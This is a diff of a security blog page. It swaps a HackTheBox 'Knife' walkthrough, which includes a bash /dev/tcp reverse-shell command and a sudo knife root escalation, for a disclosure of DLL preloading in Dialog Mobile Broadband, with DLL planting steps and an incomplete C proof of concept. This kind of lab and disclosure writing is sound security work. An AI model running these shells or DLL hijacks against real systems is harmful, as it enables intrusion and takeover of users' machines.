@@ -15,7 +15,7 @@
 </script>
 
 
-    <title>Write-ups</title>
+    <title>DLL Preloading</title>
     
     <!-- Meta -->
     <meta charset="utf-8">
@@ -65,10 +65,9 @@
 					    <a class="nav-link" href="index.html"><i class="fas fa-home fa-fw mr-2"></i>Blog Home <span class="sr-only">(current)</span></a>
 					</li>
 
-          <li class="nav-item">
+           <li class="nav-item">
 					    <a class="nav-link" href="exploits.html"><i class="fas fa-user fa-fw mr-2"></i>Exploits & Vulnerabilities</a>
 					</li> 
-
 
 					<li class="nav-item">
 					    <a class="nav-link" href="publications.html"><i class="fas fa-bookmark fa-fw mr-2"></i>Publications</a>
@@ -102,15 +101,15 @@
 
 
 
-<!-------------------------------------Article Starts Here --------------------------------------------------------------->
 
-
+    <!-------------------------------------Article Starts Here --------------------------------------------------------------->
+    
     <div class="main-wrapper">
 	    
 	    <article class="blog-post px-3 py-5 p-md-5">
 		    <div class="container">
 			    <header class="blog-post-header">
-				    <h2 class="title mb-2">Knife - HTB</h2>
+				    <h2 class="title mb-2">DLL Preloading in Dialog Mobile Broadband</h2>
 				    
 
 			    </header>
@@ -125,177 +124,103 @@
 				        <figcaption class="mt-2 text-center image-caption">Image Credit: <a href="https://made4dev.com?ref=devblog" target="_blank">made4dev.com (Premium Programming T-shirts)</a></figcaption>
 				    </figure>
 				    -------------------------------------------------------->
-
+<!---------------------------------------------------------------------Article Start-------------------------------------->
 				    <p>
 
 				    	<br>
-
-				    	<figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/knife-intro.png" alt="image"></a>
-
-				      </figure>
-
-				      <br>
-
-				      Knife is a easy machine with some new stuff to learn and exploit. let's start the machine with initial
-				      scan.
-				      
-
-				      <br><br>
-
-
-
-				      <figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-nmap1.png" alt="image"></a>
-
-				      </figure>
-
-
-				      <br> 
-
-				      Initial nmap scan shows that port 22(SSH) and 80(HTTP) is opened, i just went to explore the application which
-				      is in port 80. as you can see below, there is a website related to the health care. 
-
-				      <br><br>
-
-				    
-				      <figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-web.png" alt="image"></a>
-
-				      </figure>
-
-
-				      <br> 
-
-
-
-				      Exploring the application does not given any further hints or leads. not able to find any links or active functionalities such as account login. to move further i just checked the frameworks and technologies which has been used in the application. during the analysis i found the application is using PHP 8.1.0-dev. 
-
-
-				      <br><br>
-
-				    	<figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-php.png" alt="image"></a>
-
-				      </figure>
-
-
-				      <br>
- 
-
-              A simple exploit search revealed that mentioned PHP version is vulnerable to remote code execution due to a backdoor which is planted in that release. an attacker can execute arbitrary code by sending the User-Agentt header. this is very interesting, you can find the story of this vulnerability in this site: <br><a href='https://flast101.github.io/php-8.1.0-dev-backdoor-rce'> https://flast101.github.io/php-8.1.0-dev-backdoor-rce </a>
-
-
-              <br><br>
-
-				    	<figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-exploit.png" alt="image"></a>
-
-				      </figure>
-
-
-				      
-
-				      By running the exploit <a href='https://www.exploit-db.com/exploits/49933'> https://www.exploit-db.com/exploits/49933 </a>
-				      I'm able to get the shell of the machine after i got the user.txt
-
-				      <br><br>
-
-
-				      <figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-shell.png" alt="image"></a>
-
-				      </figure>
-
-
-
-				      <figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-user.png" alt="image"></a>
-
-				      </figure>
-
-				     
-
-				       <h4 class="title mb-2">Privilege Escalation</h4>
-                
-               As you can see below image that 'knife' can be run as sudo.
-
-		           <br>
-		           <br>
-
-		           <figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-sudo.png" alt="image"></a>
-
-				      </figure>
-
-				      Knife is a command-line tool that provides an interface between a local chef-repo and the Chef Infra Server. This is a very good documentation regarding knife : <a href='https://docs.chef.io/workstation/knife'> https://docs.chef.io/workstation/knife</a><br> To do privilege escalation, i would like to have a stable interactive shell therefore i just used this exploit to get reverse shell to my machine: <br> <a href=https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html> https://packetstormsecurity.com/files/162749/PHP-8.1.0-dev-Backdoor-Remote-Command-Injection.html</a><br>
-
-				     
-				      <br><br>
-
-
-				      <figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-shell2.png" alt="image"></a>
-
-				      </figure>
-
-				      <br><br>
-
-				      <pre>
-				      	<code>
-python3 exploit.py -u http://10.10.10.242/ -c "/bin/bash -c ' bash -i >& /dev/tcp/10.10.14.129/1234 0>&1'"
-
-				      	</code>
-				      </pre>
-
-
-				       <figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-shell3.png" alt="image"></a>
-
-				      </figure>
-
-				      
-				      Based on the knife documentation <a href='https://docs.chef.io/workstation/knife_exec/'> https://docs.chef.io/workstation/knife_exec </a> it is possible to run code via --exec sub command. by running the code i can get that root user and root.txt.
-
-          <br><br>
-
-          <pre>
-          	<code>
-
-sudo knife exec --exec "exec '/bin/sh -i'"
+                     DLL Preloading also called binary planting attacks, by placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL, adversaries may execute their own malicious payloads. Often this location is the current working directory of the program.<a href="https://attack.mitre.org/techniques/T1574/001/">  [1] </a> as a result of successful attack adversaries may totally compromise the target. attack vector and successful attacks rely on many factors that beyond the control of the attacker, considering this point DLL preloading may not be a vulnerability, however for dialog mobile broadband client application this will be a different case.
+
+                     <br>
+                     <br>
+
+                     Dialog mobile broadband is pre-installed application delivered with USB dongles. USB dongles used to access internet. a user can use dialog mobile broadband application to interact with the USB dongle to connect to the internet.
+                     This application used by financial institutions and even banks for their connectivity, therefore the impact of DLL preloading is high. considering the use cases of this application it is better to mitigate these kind of risks.
+
+                     <br>
+                     <br>
+
+                     Vulnerable Software Version : 23.015.11.01.297
+                     <br>
+                     Affected DLL's:  CallSrvPlugin.dll, GpsSrvPlugin.dll, CallAppPlugin.dll, CallLogSrvPlugin.dll, WLANPlugin.dll and MDInterface.dll
+                     <br>
+                     <br>
+                     PROOF OF CONCEPT.<br>
+
+                     1. Compile the following code as dynamic link library (DLL)<br>
+                     2. Rename to CallSrvPlugin.dll<br>
+                     3. Replace CallSrvPlugin in "C:\Program Files (x86)\Dialog Mobile Broadband"<br>
+                     4. Launch Dialog Mobile Broadband<br>
+                     5. MessageBox executes that verifies the dll hijacking is successful.<br>
+
+                     <br>
+                     <pre>
+                     	<code>
+#include <<g>windows.h>
+
+int dll_hijack()
+{
+MessageBox(0, "DLL Preloading in dialog mobile broadband", "DLL Message", MB_OK);
+return 0;
+}
+
+BOOL WINAPI DllMain (
+HANDLE hinstDLL,
+DWORD fdwReason,
+LPVOID lpvReserved)
+{
+
+dll_hijack();
 
 </code>
 </pre>
 
-<figure class="blog-banner">
-
-				        <a><img class="img-fluid" src="assets/images/writeup/knife/kn-root.png" alt="image"></a>
-
-				      </figure>
 
 
 
+                     <figure class="blog-banner">
+
+    				        <a><img class="img-fluid" src="assets/images/vuln-1/1.PNG" alt="image"></a>
+
+				            </figure>
+
+				            <br>
+
+				            <br>
+
+
+                    <figure class="blog-banner">
+
+    				        <a><img class="img-fluid" src="assets/images/vuln-1/2.PNG" alt="image"></a>
+
+				            </figure>
+
+				            <br>
+
+				            <br>
+
+
+                    <figure class="blog-banner">
+
+    				        <a><img class="img-fluid" src="assets/images/vuln-1/3.PNG" alt="image"></a>
+
+				            </figure>
+
+				            <br>
+
+				            <b>Timeline</b>
+				            <br>
+
+				            Initial Report Sent to the Vendor : 10/9/2017
+				            <br>
+				            No response from vendor after reminders
+				            <br>
+				            Vendor site : <a href= "https://www.dialog.lk/"> https://www.dialog.lk </a> 
 
 
 
 
- 
 
-
-
-	
-
-<!--------------------------------------------Article End ------------------------------------------------------>
+				    <!--------------------------------------------Article End ------------------------------------------------------>
 
 
 
@@ -364,3 +289,4 @@ export  $initHighlight;
 
 </body>
 </html> 
+
